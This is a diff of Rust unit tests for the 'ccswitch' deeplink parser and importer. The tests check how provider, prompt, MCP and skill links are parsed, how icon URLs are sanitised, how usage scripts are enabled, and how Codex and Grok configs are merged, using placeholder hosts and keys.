-#[test]
-fn test_build_claude_provider_without_config_unchanged() {
-    // Backward compatibility: deeplinks without a `config` field still
-    // produce exactly the same env shape as before — only the standard
-    // ANTHROPIC_* keys, nothing else.
-    use super::provider::build_provider_from_request;
-
-    let request = DeepLinkImportRequest {
-        version: "v1".to_string(),
-        resource: "provider".to_string(),
-        app: Some("claude".to_string()),
-        name: Some("Plain".to_string()),
-        homepage: Some("https://example.com".to_string()),
-        endpoint: Some("https://api.example.com".to_string()),
-        api_key: Some("sk".to_string()),
-        icon: None,
-        model: None,
-        notes: None,
-        haiku_model: None,
-        sonnet_model: None,
-        opus_model: None,
-        api_format: None,
-        config: None,
-        config_format: None,
-        config_url: None,
-        icon_url: None,
-        apps: None,
-        repo: None,
-        directory: None,
-        branch: None,
-        content: None,
-        description: None,
-        enabled: None,
-        usage_enabled: None,
-        usage_script: None,
-        usage_api_key: None,
-        usage_base_url: None,
-        usage_access_token: None,
-        usage_user_id: None,
-        usage_auto_interval: None,
-    };
-
-    let provider = build_provider_from_request(&AppType::Claude, &request).unwrap();
-    let env = provider.settings_config["env"].as_object().unwrap();
-
-    assert_eq!(env["ANTHROPIC_AUTH_TOKEN"], "sk");
-    assert_eq!(env["ANTHROPIC_BASE_URL"], "https://api.example.com");
-    // No extras leaked in
-    assert_eq!(env.len(), 2);
-}
-
-// =============================================================================
-// Prompt Tests
-// =============================================================================
-
-// Integration-style unit test: prompt import reaches PromptService and resolves
-// live config file paths, so HOME must be isolated before it runs.
-#[test]
-#[serial_test::serial]
-fn test_import_prompt_allows_space_in_base64_content() {
-    let _test_home = TempUserHome::new();
-    let url = "ccswitch://v1/import?resource=prompt&app=codex&name=PromptPlus&content=Pj4+";
-    let request = parse_deeplink_url(url).unwrap();
-
-    // URL decoded content may have "+" become space
-    assert_eq!(request.content.as_deref(), Some("Pj4 "));
-
-    let db = Arc::new(Database::memory().expect("create memory db"));
-    let state = AppState::new(db.clone());
-
-    let prompt_id = import_prompt_from_deeplink(&state, request.clone()).expect("import prompt");
-
-    let prompts = state.db.get_prompts(&AppType::Codex).expect("get prompts");
-    let prompt = prompts.get(&prompt_id).expect("prompt saved");
-
-    assert_eq!(prompt.content, ">>>");
-    assert_eq!(prompt.name, request.name.unwrap());
-}
-
-// =============================================================================
-// MCP Tests
-// =============================================================================
-
-#[test]
-fn test_parse_mcp_apps() {
-    let apps = parse_mcp_apps("claude,codex").unwrap();
-    assert!(apps.claude);
-    assert!(apps.codex);
-    assert!(!apps.gemini);
-
-    let apps = parse_mcp_apps("gemini").unwrap();
-    assert!(!apps.claude);
-    assert!(!apps.codex);
-    assert!(apps.gemini);
-
-    let apps = parse_mcp_apps("grokbuild,opencode,hermes").unwrap();
-    assert!(apps.grokbuild);
-    assert!(apps.opencode);
-    assert!(apps.hermes);
-
-    let err = parse_mcp_apps("invalid").unwrap_err();
-    assert!(err.to_string().contains("Invalid app"));
-}
-
-#[test]
-fn test_parse_prompt_deeplink() {
-    let content = "Hello World";
-    let content_b64 = BASE64_STANDARD.encode(content);
-    let url = format!(
-        "ccswitch://v1/import?resource=prompt&app=claude&name=test&content={}&description=desc&enabled=true",
-        content_b64
-    );
-
-    let request = parse_deeplink_url(&url).unwrap();
-    assert_eq!(request.resource, "prompt");
-    assert_eq!(request.app.unwrap(), "claude");
-    assert_eq!(request.name.unwrap(), "test");
-    assert_eq!(request.content.unwrap(), content_b64);
-    assert_eq!(request.description.unwrap(), "desc");
-    assert!(request.enabled.unwrap());
-}
-
-#[test]
-fn test_parse_grokbuild_prompt_deeplink() {
-    let content_b64 = BASE64_STANDARD.encode("Grok instructions");
-    let url = format!(
-        "ccswitch://v1/import?resource=prompt&app=grokbuild&name=test&content={content_b64}"
-    );
-
-    let request = parse_deeplink_url(&url).expect("parse Grok Build prompt deeplink");
-
-    assert_eq!(request.app.as_deref(), Some("grokbuild"));
-}
-
-#[test]
-fn test_parse_mcp_deeplink() {
-    let config = r#"{"mcpServers":{"test":{"command":"echo"}}}"#;
-    let config_b64 = BASE64_STANDARD.encode(config);
-    let url = format!(
-        "ccswitch://v1/import?resource=mcp&apps=claude,codex&config={}&enabled=true",
-        config_b64
-    );
-
-    let request = parse_deeplink_url(&url).unwrap();
-    assert_eq!(request.resource, "mcp");
-    assert_eq!(request.apps.unwrap(), "claude,codex");
-    assert_eq!(request.config.unwrap(), config_b64);
-    assert!(request.enabled.unwrap());
-}
-
-#[test]
-fn test_parse_grokbuild_mcp_deeplink() {
-    let config = r#"{"mcpServers":{"test":{"command":"echo"}}}"#;
-    let config_b64 = BASE64_STANDARD.encode(config);
-    let url = format!(
-        "ccswitch://v1/import?resource=mcp&apps=grokbuild&config={config_b64}&enabled=true"
-    );
-
-    let request = parse_deeplink_url(&url).expect("parse Grok Build MCP deeplink");
-
-    assert_eq!(request.apps.as_deref(), Some("grokbuild"));
-}
-
-/// 入口白名单要和下层 `parse_mcp_apps` 一致，支持 MCP 的 MiniMax Code、Pi 不能在这里被拒
-#[test]
-fn test_parse_mcode_and_pi_mcp_deeplink() {
-    let config = r#"{"mcpServers":{"test":{"command":"echo"}}}"#;
-    let config_b64 = BASE64_STANDARD.encode(config);
-    let url =
-        format!("ccswitch://v1/import?resource=mcp&apps=mcode,pi&config={config_b64}&enabled=true");
-
-    let request = parse_deeplink_url(&url).expect("parse MiniMax Code / Pi MCP deeplink");
-    let apps = request.apps.as_deref().unwrap();
-    assert_eq!(apps, "mcode,pi");
-    let parsed = crate::deeplink::mcp::parse_mcp_apps(apps).unwrap();
-    assert!(parsed.mcode && parsed.pi);
-}
-
-#[test]
-fn test_parse_skill_deeplink() {
-    let url = "ccswitch://v1/import?resource=skill&repo=owner/repo&directory=skills&branch=dev";
-    let request = parse_deeplink_url(url).unwrap();
-
-    assert_eq!(request.resource, "skill");
-    assert_eq!(request.repo.unwrap(), "owner/repo");
-    assert_eq!(request.directory.unwrap(), "skills");
-    assert_eq!(request.branch.unwrap(), "dev");
-}
-
-// =============================================================================
-// Multiple Endpoints Tests
-// =============================================================================
-
-#[test]
-fn test_parse_multiple_endpoints_comma_separated() {
-    let url = "ccswitch://v1/import?resource=provider&app=claude&name=Test&endpoint=https%3A%2F%2Fapi1.example.com,https%3A%2F%2Fapi2.example.com,https%3A%2F%2Fapi3.example.com&apiKey=sk-test";
-
-    let request = parse_deeplink_url(url).unwrap();
-
-    assert!(request.endpoint.is_some());
-    let endpoint = request.endpoint.unwrap();
-    // Should contain all endpoints comma-separated
-    assert!(endpoint.contains("https://api1.example.com"));
-    assert!(endpoint.contains("https://api2.example.com"));
-    assert!(endpoint.contains("https://api3.example.com"));
-}
-
-#[test]
-fn test_parse_single_endpoint_backward_compatible() {
-    // Old format with single endpoint should still work
-    let url = "ccswitch://v1/import?resource=provider&app=claude&name=Test&endpoint=https%3A%2F%2Fapi.example.com&apiKey=sk-test";
-
-    let request = parse_deeplink_url(url).unwrap();
-
-    assert_eq!(
-        request.endpoint,
-        Some("https://api.example.com".to_string())
-    );
-}
-
-#[test]
-#[serial_test::serial]
-fn test_import_trims_spaces_around_comma_separated_endpoints() {
-    let _home = TempUserHome::new();
-    let url = "ccswitch://v1/import?resource=provider&app=claude&name=Test&endpoint=https%3A%2F%2Fapi1.example.com%20,%20https%3A%2F%2Fapi2.example.com&apiKey=sk-test";
-
-    let request = parse_deeplink_url(url).expect("spaces around commas are accepted");
-    let state = AppState::new(Arc::new(Database::memory().expect("create memory db")));
-    let id = super::import_provider_from_deeplink(&state, request).expect("import provider");
-
-    let stored = state
-        .db
-        .get_provider_by_id(&id, &AppType::Claude)
+fn imported_usage_script(
+    app_type: AppType,
+    request: &DeepLinkImportRequest,
+) -> Option<UsageScript> {
+    build_provider_from_request(&app_type, request)
         .unwrap()
-        .unwrap();
-    assert_eq!(
-        stored.settings_config["env"]["ANTHROPIC_BASE_URL"],
-        "https://api1.example.com"
-    );
-    let extra: Vec<String> =
-        crate::services::ProviderService::get_custom_endpoints(&state, AppType::Claude, &id)
-            .unwrap()
-            .into_iter()
-            .map(|endpoint| endpoint.url)
-            .collect();
-    assert_eq!(extra, vec!["https://api2.example.com"]);
+        .meta
+        .and_then(|meta| meta.usage_script)
 }
-
-#[test]
-fn test_infer_homepage_from_endpoint_without_homepage() {
-    // Test that homepage is auto-inferred from endpoint when not provided
-    assert_eq!(
-        infer_homepage_from_endpoint("https://api.cubence.com/v1"),
-        Some("https://cubence.com".to_string())
-    );
-    assert_eq!(
-        infer_homepage_from_endpoint("https://cubence.com"),
-        Some("https://cubence.com".to_string())
-    );
-}
-
-// ============ Codex：链接附带的 config.toml ============
 
 /// 带 `config` 的 Codex 链接，走公开入口合并后建行，返回行的 `settings_config`。
 fn import_codex_with_config(
@@ -1200,8 +78,6 @@ fn import_codex_with_config(
     endpoint: Option<&str>,
     model: Option<&str>,
 ) -> Result<serde_json::Value, crate::error::AppError> {
-    use super::provider::build_provider_from_request;
-
     let request = DeepLinkImportRequest {
         version: "v1".to_string(),
         resource: "provider".to_string(),
@@ -1242,130 +118,667 @@ fn projected_route_table(settings: &serde_json::Value) -> toml_edit::Table {
     }
 }
 
+fn import_grok_with_config(config_toml: &str) -> Result<serde_json::Value, crate::error::AppError> {
+    let request = DeepLinkImportRequest {
+        version: "v1".to_string(),
+        resource: "provider".to_string(),
+        app: Some("grokbuild".to_string()),
+        name: Some("Relay Card".to_string()),
+        endpoint: Some("https://api.relay.example/v1".to_string()),
+        api_key: Some("xai-link".to_string()),
+        config: Some(BASE64_STANDARD.encode(json!({ "config": config_toml }).to_string())),
+        config_format: Some("json".to_string()),
+        ..Default::default()
+    };
+    let merged = parse_and_merge_config(&request)?;
+    Ok(build_provider_from_request(&AppType::GrokBuild, &merged)?.settings_config)
+}
+
+// =============================================================================
+// Parser, Utils & Pending Queue
+// =============================================================================
+
 #[test]
-fn test_codex_link_config_keeps_provider_auth_fields_through_to_live() {
-    // #7438：链接里的鉴权方式和必需的头要原样落到行里，切换时写进 live
-    let config = serde_json::json!({
-        "auth": { "OPENAI_API_KEY": "sk-link" },
-        "config": concat!(
-            "model_provider = \"custom\"\n",
-            "model = \"gpt-5.5\"\n",
-            "model_reasoning_effort = \"medium\"\n\n",
-            "[model_providers.custom]\n",
-            "name = \"Relay Auth\"\n",
-            "base_url = \"https://api.relay.example/v1\"\n",
-            "wire_api = \"responses\"\n",
-            "requires_openai_auth = false\n",
-            "http_headers = { \"x-openai-actor-authorization\" = \"1\" }\n",
-            "supports_websockets = true\n",
-            "experimental_bearer_token = \"sk-link\"\n",
-        )
-    });
+fn parse_valid_provider_deeplink() {
+    let url = "ccswitch://v1/import?resource=provider&app=claude&name=Test%20Provider&homepage=https%3A%2F%2Fexample.com&endpoint=https%3A%2F%2Fapi.example.com&apiKey=sk-test-123&icon=claude&notes=Test%20notes";
 
-    let settings = import_codex_with_config(config, None, None).unwrap();
-    assert_eq!(settings["auth"]["OPENAI_API_KEY"], "sk-link");
+    let request = parse_deeplink_url(url).unwrap();
 
-    let doc = row_config(&settings);
-    assert_eq!(doc["model"].as_str(), Some("gpt-5.5"));
-    assert_eq!(doc["model_reasoning_effort"].as_str(), Some("medium"));
-    let table = &doc["model_providers"]["custom"];
-    assert_eq!(table["name"].as_str(), Some("Relay Auth"));
-    assert_eq!(table["requires_openai_auth"].as_bool(), Some(false));
-    assert_eq!(table["supports_websockets"].as_bool(), Some(true));
-    assert_eq!(
-        table["http_headers"]["x-openai-actor-authorization"].as_str(),
-        Some("1")
-    );
-    assert_eq!(table["experimental_bearer_token"].as_str(), Some("sk-link"));
-
-    let live = projected_route_table(&settings);
-    assert_eq!(
-        live["experimental_bearer_token"].as_str(),
-        Some("sk-link"),
-        "切换时 Key 写成路由表的 bearer token"
-    );
-    assert_eq!(live["supports_websockets"].as_bool(), Some(true));
-    assert!(live["http_headers"]
-        .as_table_like()
-        .is_some_and(|headers| headers.contains_key("x-openai-actor-authorization")));
+    assert_eq!(request.version, "v1");
+    assert_eq!(request.resource, "provider");
+    assert_eq!(request.app.as_deref(), Some("claude"));
+    assert_eq!(request.name.as_deref(), Some("Test Provider"));
+    assert_eq!(request.homepage.as_deref(), Some("https://example.com"));
+    assert_eq!(request.endpoint.as_deref(), Some("https://api.example.com"));
+    assert_eq!(request.api_key.as_deref(), Some("sk-test-123"));
+    assert_eq!(request.icon.as_deref(), Some("claude"));
+    assert_eq!(request.notes.as_deref(), Some("Test notes"));
 }
 
 #[test]
-fn test_codex_link_url_params_override_the_config_and_refresh_the_bearer_token() {
-    let config = serde_json::json!({
-        "config": concat!(
-            "model_provider = \"relay\"\nmodel = \"from-config\"\n\n",
-            "[model_providers.relay]\nbase_url = \"https://old.relay.example/v1\"\n",
-            "experimental_bearer_token = \"sk-stale\"\n",
-        )
-    });
+fn parse_sanitizes_icon_and_icon_url_without_failing_link() {
+    let base = "ccswitch://v1/import?resource=provider&app=claude&name=Test&endpoint=https%3A%2F%2Fapi.example.com&apiKey=sk-test";
 
-    let settings = import_codex_with_config(
-        config,
-        Some("https://api.relay.example/v1"),
-        Some("from-url"),
+    // 内置图标大小写与空白归一
+    let request = parse_deeplink_url(&format!("{base}&icon=%20DeepSeek%20")).unwrap();
+    assert_eq!(request.icon.as_deref(), Some("deepseek"));
+
+    // 非内置图标名丢弃，不阻断整条链接
+    for icon in [
+        "data%3Aimage%2Fpng%3Bbase64%2CiVBORw0KGgo%3D",
+        "https%3A%2F%2Fexample.com%2Flogo.png",
+        "%3Csvg%3E",
+    ] {
+        let request = parse_deeplink_url(&format!("{base}&icon={icon}")).unwrap();
+        assert_eq!(request.icon, None, "{icon}");
+    }
+
+    // 合法 HTTPS iconUrl 与内置图标共存（下载失败回退内置图标）
+    let request = parse_deeplink_url(&format!(
+        "{base}&icon=deepseek&iconUrl=https%3A%2F%2Fcdn.example.com%2Flogo.svg"
+    ))
+    .unwrap();
+    assert_eq!(
+        request.icon_url.as_deref(),
+        Some("https://cdn.example.com/logo.svg")
+    );
+    assert_eq!(request.icon.as_deref(), Some("deepseek"));
+
+    // http、IP、内网主机名、带端口、data URI：丢弃，链接本身照常解析
+    for url in [
+        "http%3A%2F%2Fexample.com%2Flogo.png",
+        "https%3A%2F%2F127.0.0.1%2Flogo.png",
+        "https%3A%2F%2F%5B%3A%3A1%5D%2Flogo.png",
+        "https%3A%2F%2Flocalhost%2Flogo.png",
+        "https%3A%2F%2Fexample.com%3A8080%2Flogo.png",
+        "data%3Aimage%2Fpng%3Bbase64%2CiVBORw0KGgo%3D",
+    ] {
+        let request = parse_deeplink_url(&format!("{base}&iconUrl={url}")).unwrap();
+        assert_eq!(request.icon_url, None, "{url}");
+    }
+}
+
+#[test]
+fn parse_rejects_malformed_and_unsupported_deeplinks() {
+    for (case, url, error) in [
+        (
+            "invalid_scheme",
+            "https://v1/import?resource=provider&app=claude&name=Test",
+            "Invalid scheme",
+        ),
+        (
+            "unsupported_version",
+            "ccswitch://v2/import?resource=provider&app=claude&name=Test",
+            "Unsupported protocol version",
+        ),
+        (
+            "missing_name",
+            "ccswitch://v1/import?resource=provider&app=claude",
+            "Missing 'name' parameter",
+        ),
+        // configUrl 未实现，必须在解析阶段拦截，而不是确认导入后才报错
+        (
+            "unsupported_config_url",
+            "ccswitch://v1/import?resource=provider&app=claude&name=Test&configUrl=https%3A%2F%2Fexample.com%2Fc.json",
+            "configUrl",
+        ),
+    ] {
+        let err = parse_deeplink_url(url).expect_err(case);
+        assert!(err.to_string().contains(error), "{case}: {err}");
+    }
+}
+
+#[test]
+fn parse_provider_deeplink_requires_model_for_model_mandatory_apps() {
+    for app in ["pi", "mcode", "kimi", "dsh", "omp", "workbuddy", "zcode"] {
+        let request = parse_deeplink_url(&provider_link(app, None))
+            .unwrap_or_else(|err| panic!("{app} link should parse: {err}"));
+        assert_eq!(request.app.as_deref(), Some(app));
+
+        let url = format!(
+            "ccswitch://v1/import?resource=provider&app={app}&name=Test&endpoint=https%3A%2F%2Fapi.example.com&apiKey=sk"
+        );
+        let err = parse_deeplink_url(&url).expect_err("a node without models is unusable");
+        assert!(err.to_string().contains("model"), "{app}: {err}");
+    }
+}
+
+/// 入口白名单与 `parse_mcp_apps` 必须同步覆盖全部支持 MCP 的应用，避免解析层先拦掉下层支持的应用。
+#[test]
+fn parse_mcp_deeplink_and_apps_stay_in_sync_for_all_mcp_clients() {
+    let config = BASE64_URL_SAFE_NO_PAD.encode(r#"{"mcpServers":{"fetch":{"command":"uvx"}}}"#);
+
+    let mut checked = 0;
+    for app in AppType::all().filter(|app| McpApps::only(app).is_enabled_for(app)) {
+        let name = app.as_str();
+        let url =
+            format!("ccswitch://v1/import?resource=mcp&apps={name}&config={config}&enabled=true");
+        let request = parse_deeplink_url(&url)
+            .unwrap_or_else(|err| panic!("parser must accept MCP app '{name}': {err}"));
+        assert_eq!(request.resource, "mcp");
+        assert_eq!(request.apps.as_deref(), Some(name));
+        assert_eq!(request.config.as_deref(), Some(config.as_str()));
+        assert_eq!(request.enabled, Some(true));
+
+        let parsed = parse_mcp_apps(request.apps.as_deref().unwrap())
+            .unwrap_or_else(|err| panic!("parse_mcp_apps must accept '{name}': {err}"));
+        assert_eq!(parsed.enabled_apps(), vec![app]);
+        checked += 1;
+    }
+    assert!(checked > 0);
+
+    // 多目标、别名、OpenClaw 静默忽略、非法名称拒绝
+    let multi = parse_deeplink_url(&format!(
+        "ccswitch://v1/import?resource=mcp&apps=claude,grok,work-buddy,openclaw&config={config}"
+    ))
+    .unwrap();
+    let parsed = parse_mcp_apps(multi.apps.as_deref().unwrap()).unwrap();
+    assert!(parsed.claude && parsed.grokbuild && parsed.workbuddy && !parsed.codex);
+
+    // OpenClaw 不支持 MCP：解析放行但单独使用时无有效目标
+    assert!(parse_mcp_apps("openclaw").is_err());
+
+    assert!(parse_deeplink_url(&format!(
+        "ccswitch://v1/import?resource=mcp&apps=invalid&config={config}"
+    ))
+    .is_err());
+    let err = parse_mcp_apps("invalid").unwrap_err();
+    assert!(err.to_string().contains("Invalid app"), "{err}");
+}
+
+#[test]
+fn parse_prompt_deeplink_parses_fields_and_supported_apps() {
+    let content_b64 = BASE64_STANDARD.encode("Hello World");
+    let url = format!(
+        "ccswitch://v1/import?resource=prompt&app=claude&name=test&content={content_b64}&description=desc&enabled=true"
+    );
+    let request = parse_deeplink_url(&url).unwrap();
+    assert_eq!(request.resource, "prompt");
+    assert_eq!(request.app.as_deref(), Some("claude"));
+    assert_eq!(request.name.as_deref(), Some("test"));
+    assert_eq!(request.content.as_deref(), Some(content_b64.as_str()));
+    assert_eq!(request.description.as_deref(), Some("desc"));
+    assert_eq!(request.enabled, Some(true));
+
+    for app in [
+        "codex",
+        "gemini",
+        "agy",
+        "grokbuild",
+        "opencode",
+        "openclaw",
+        "hermes",
+        "pi",
+        "mcode",
+        "copilot",
+    ] {
+        let request = parse_deeplink_url(&format!(
+            "ccswitch://v1/import?resource=prompt&app={app}&name=Rules&content={content_b64}"
+        ))
+        .unwrap_or_else(|err| panic!("prompt deeplink should accept '{app}': {err}"));
+        assert_eq!(request.app.as_deref(), Some(app));
+    }
+
+    assert!(parse_deeplink_url(&format!(
+        "ccswitch://v1/import?resource=prompt&app=unknown&name=Rules&content={content_b64}"
+    ))
+    .is_err());
+}
+
+#[test]
+fn skill_deeplink_parses_and_imports_shared_repository() {
+    let request = parse_deeplink_url(
+        "ccswitch://v1/import?resource=skill&repo=example/skills&directory=skills&branch=dev&app=agy",
     )
     .unwrap();
-    let doc = row_config(&settings);
+    assert_eq!(request.resource, "skill");
+    assert_eq!(request.repo.as_deref(), Some("example/skills"));
+    assert_eq!(request.directory.as_deref(), Some("skills"));
+    assert_eq!(request.branch.as_deref(), Some("dev"));
+    assert!(request.app.is_none());
 
-    // 选路一律写成 custom，链接自己的 id 不带进来
-    assert_eq!(doc["model_provider"].as_str(), Some("custom"));
-    assert!(doc["model_providers"].get("relay").is_none());
-    let table = &doc["model_providers"]["custom"];
+    let state = AppState::new(Arc::new(Database::memory().unwrap()));
     assert_eq!(
-        table["base_url"].as_str(),
-        Some("https://api.relay.example/v1")
+        super::skill::import_skill_from_deeplink(&state, request).unwrap(),
+        "example/skills"
     );
-    assert_eq!(table["name"].as_str(), Some("Relay"));
-    assert_eq!(table["wire_api"].as_str(), Some("responses"));
-    assert_eq!(doc["model"].as_str(), Some("from-url"));
-    // 表里只留一份 Key，和 auth 同值，降级后旧版也不会拿到过期的 Key
-    assert_eq!(table["experimental_bearer_token"].as_str(), Some("sk-link"));
+    assert!(state.db.get_all_installed_skills().unwrap().is_empty());
+}
+
+/// 读取不清除，按编号确认才清除：前端读到后、显示前被打断（effect 重建、窗口销毁），
+/// 下次读取仍能拿到；期间来了新链接，迟到的旧确认不能把新链接清掉
+#[test]
+#[serial_test::serial]
+fn test_pending_deeplink_survives_peek_and_clears_only_on_matching_ack() {
+    use super::{
+        ack_pending_deeplink, peek_pending_deeplink, set_pending_deeplink, PendingDeepLink,
+    };
+
+    let link = |name: &str| PendingDeepLink::Import {
+        request: Box::new(
+            parse_deeplink_url(&format!(
+                "ccswitch://v1/import?resource=provider&app=claude&name={name}"
+            ))
+            .expect("valid link"),
+        ),
+    };
+
+    set_pending_deeplink(link("A"));
+    let first = peek_pending_deeplink().expect("pending link");
+    let json = serde_json::to_value(&first).unwrap();
+    assert_eq!(json["link"]["kind"], "import");
+    assert_eq!(json["link"]["request"]["name"], "A");
+    assert_eq!(
+        peek_pending_deeplink().map(|entry| entry.id),
+        Some(first.id),
+        "peek must not clear the link"
+    );
+
+    set_pending_deeplink(link("B"));
+    ack_pending_deeplink(first.id);
+    let second = peek_pending_deeplink().expect("a stale ack must not clear the newer link");
+    assert_ne!(second.id, first.id);
+
+    ack_pending_deeplink(second.id);
+    assert!(peek_pending_deeplink().is_none());
 }
 
 #[test]
-fn test_codex_link_config_keeps_same_origin_model_catalog_url() {
-    // #7942
-    let config = serde_json::json!({
-        "config": concat!(
-            "[model_providers.custom]\n",
-            "base_url = \"https://api.relay.example/v1\"\n",
-            "model_catalog_url = \"https://api.relay.example/v1/models?format=codex\"\n",
+fn utils_url_validation_and_homepage_inference() {
+    assert!(validate_url("not-a-url", "test").is_err());
+    let err = validate_url("ftp://example.com", "test").unwrap_err();
+    assert!(err.to_string().contains("must be http or https"), "{err}");
+
+    for (endpoint, expected) in [
+        ("https://api.anthropic.com/v1", "https://anthropic.com"),
+        (
+            "https://api-test.company.com/v1",
+            "https://test.company.com",
+        ),
+        ("https://example.com", "https://example.com"),
+    ] {
+        assert_eq!(
+            infer_homepage_from_endpoint(endpoint).as_deref(),
+            Some(expected),
+            "{endpoint}"
+        );
+    }
+}
+
+#[test]
+#[serial_test::serial]
+fn test_import_trims_spaces_around_comma_separated_endpoints() {
+    let _home = TempUserHome::new();
+    let url = "ccswitch://v1/import?resource=provider&app=claude&name=Test&endpoint=https%3A%2F%2Fapi1.example.com%20,%20https%3A%2F%2Fapi2.example.com%20,%20https%3A%2F%2Fapi3.example.com&apiKey=sk-test";
+
+    let request = parse_deeplink_url(url).expect("spaces around commas are accepted");
+    let state = AppState::new(Arc::new(Database::memory().expect("create memory db")));
+    let id = super::import_provider_from_deeplink(&state, request).expect("import provider");
+
+    let stored = state
+        .db
+        .get_provider_by_id(&id, &AppType::Claude)
+        .unwrap()
+        .unwrap();
+    assert_eq!(
+        stored.settings_config["env"]["ANTHROPIC_BASE_URL"],
+        "https://api1.example.com"
+    );
+    let mut extra: Vec<String> =
+        crate::services::ProviderService::get_custom_endpoints(&state, AppType::Claude, &id)
+            .unwrap()
+            .into_iter()
+            .map(|endpoint| endpoint.url)
+            .collect();
+    extra.sort();
+    assert_eq!(
+        extra,
+        vec!["https://api2.example.com", "https://api3.example.com"]
+    );
+}
+
+// =============================================================================
+// Usage Script & Coding Plan Meta
+// =============================================================================
+
+#[test]
+fn deeplink_usage_script_enablement_rules() {
+    let code = "export async function query() { return { cost: 0 }; }";
+    let encoded = BASE64_STANDARD.encode(code);
+
+    for (case, has_code, usage_enabled, expected_enabled) in [
+        // 站长放脚本就是为了让用户看到余额；没写 usageEnabled 时带脚本即默认启用
+        ("script_defaults_on", true, None, true),
+        // usageEnabled=false 必须照办，且保留代码供用户后续手动开启
+        ("script_explicit_opt_out", true, Some(false), false),
+        ("script_explicit_enable", true, Some(true), true),
+        // 只带凭据字段、没有脚本时不应默认启用
+        ("fields_without_script_default_off", false, None, false),
+    ] {
+        let mut request = claude_provider_request();
+        request.usage_enabled = usage_enabled;
+        if has_code {
+            request.usage_script = Some(encoded.clone());
+        } else {
+            request.usage_access_token = Some("token".to_string());
+        }
+
+        let script = imported_usage_script(AppType::Claude, &request)
+            .unwrap_or_else(|| panic!("{case}: usage script should be created"));
+        assert_eq!(script.enabled, expected_enabled, "{case}");
+        if has_code {
+            assert_eq!(script.code, code, "{case}");
+        }
+    }
+}
+
+#[test]
+fn deeplink_usage_script_credential_override_rules() {
+    for (case, usage_api_key, usage_base_url, expected_key, expected_url) in [
+        ("omitted_does_not_copy_provider", None, None, None, None),
+        (
+            "matching_provider_credentials_omitted",
+            Some(" sk-main "),
+            Some(" https://api.example.com/v1/ "),
+            None,
+            None,
+        ),
+        (
+            "distinct_credentials_preserved_and_trimmed",
+            Some(" sk-usage "),
+            Some(" https://usage.example/api/ "),
+            Some("sk-usage"),
+            Some("https://usage.example/api"),
+        ),
+    ] {
+        let mut request = claude_provider_request();
+        request.usage_enabled = Some(true);
+        request.usage_api_key = usage_api_key.map(str::to_string);
+        request.usage_base_url = usage_base_url.map(str::to_string);
+
+        let script = imported_usage_script(AppType::Claude, &request)
+            .unwrap_or_else(|| panic!("{case}: usage script should be created"));
+        assert!(script.enabled, "{case}");
+        assert_eq!(script.api_key.as_deref(), expected_key, "{case}");
+        assert_eq!(script.base_url.as_deref(), expected_url, "{case}");
+    }
+}
+
+#[test]
+fn deeplink_coding_plan_auto_detection_rules() {
+    let plan_request = |app: &str, endpoint: &str| DeepLinkImportRequest {
+        app: Some(app.to_string()),
+        endpoint: Some(endpoint.to_string()),
+        ..claude_provider_request()
+    };
+
+    // 套餐地址默认开启套餐用量，所有应用一视同仁
+    for (app, app_type) in [
+        ("claude", AppType::Claude),
+        ("codex", AppType::Codex),
+        ("opencode", AppType::OpenCode),
+        ("hermes", AppType::Hermes),
+    ] {
+        let script = imported_usage_script(
+            app_type,
+            &plan_request(app, "https://api.kimi.com/coding/v1"),
         )
-    });
+        .unwrap_or_else(|| panic!("{app} 应自动开启套餐用量"));
+        assert!(script.enabled, "{app}");
+        assert_eq!(script.template_type.as_deref(), Some("token_plan"));
+        assert_eq!(script.coding_plan_provider.as_deref(), Some("kimi"));
+        assert!(script.code.is_empty());
+    }
 
-    let settings = import_codex_with_config(config, None, Some("custom-model")).unwrap();
-    assert_eq!(
-        row_config(&settings)["model_providers"]["custom"]["model_catalog_url"].as_str(),
-        Some("https://api.relay.example/v1/models?format=codex")
+    // 显式 usageEnabled=false 必须照办
+    let mut opt_out = plan_request("claude", "https://open.bigmodel.cn/api/anthropic");
+    opt_out.usage_enabled = Some(false);
+    let script = imported_usage_script(AppType::Claude, &opt_out).unwrap();
+    assert!(!script.enabled);
+    assert_eq!(script.coding_plan_provider.as_deref(), Some("zhipu"));
+
+    // 链接自带脚本时不被套餐模板替换
+    let code = "export async function query() { return { cost: 0 }; }";
+    let mut with_script = plan_request("claude", "https://api.kimi.com/coding/v1");
+    with_script.usage_script = Some(BASE64_STANDARD.encode(code));
+    let script = imported_usage_script(AppType::Claude, &with_script).unwrap();
+    assert_eq!(script.code, code);
+    assert_eq!(script.template_type, None);
+
+    // 火山只预选套餐、默认关闭；显式 usageEnabled=true 时照办
+    let script = imported_usage_script(
+        AppType::OpenCode,
+        &plan_request("opencode", "https://ark.cn-beijing.volces.com/api/plan/v3"),
+    )
+    .unwrap();
+    assert!(!script.enabled);
+    assert_eq!(script.coding_plan_provider.as_deref(), Some("volcengine"));
+
+    let mut volc_on = plan_request("claude", "https://ark.cn-beijing.volces.com/api/coding");
+    volc_on.usage_enabled = Some(true);
+    assert!(
+        imported_usage_script(AppType::Claude, &volc_on)
+            .unwrap()
+            .enabled
     );
+
+    // 非套餐地址与非 Claude 下的 ZenMux 保持关闭
+    assert!(imported_usage_script(
+        AppType::Claude,
+        &plan_request("claude", "https://api.example.com/v1"),
+    )
+    .is_none());
+    assert!(imported_usage_script(
+        AppType::Codex,
+        &plan_request("codex", "https://zenmux.ai/api/v1"),
+    )
+    .is_none());
+    assert!(imported_usage_script(
+        AppType::Claude,
+        &plan_request("claude", "https://zenmux.ai/api/anthropic"),
+    )
+    .is_some());
+}
+
+// =============================================================================
+// Gemini, Claude, Codex & Grok Config Merge and Build
+// =============================================================================
+
+#[test]
+fn build_gemini_provider_sets_model_only_when_present() {
+    let base = DeepLinkImportRequest {
+        version: "v1".to_string(),
+        resource: "provider".to_string(),
+        app: Some("gemini".to_string()),
+        name: Some("Test Gemini".to_string()),
+        homepage: Some("https://example.com".to_string()),
+        endpoint: Some("https://api.example.com".to_string()),
+        api_key: Some("test-api-key".to_string()),
+        ..Default::default()
+    };
+
+    let with_model = build_provider_from_request(
+        &AppType::Gemini,
+        &DeepLinkImportRequest {
+            model: Some("gemini-2.0-flash".to_string()),
+            ..base.clone()
+        },
+    )
+    .unwrap();
+    assert_eq!(with_model.name, "Test Gemini");
     assert_eq!(
-        projected_route_table(&settings)["model_catalog_url"].as_str(),
-        Some("https://api.relay.example/v1/models?format=codex")
+        with_model.website_url.as_deref(),
+        Some("https://example.com")
     );
+    let env = with_model.settings_config["env"].as_object().unwrap();
+    assert_eq!(env["GEMINI_API_KEY"], "test-api-key");
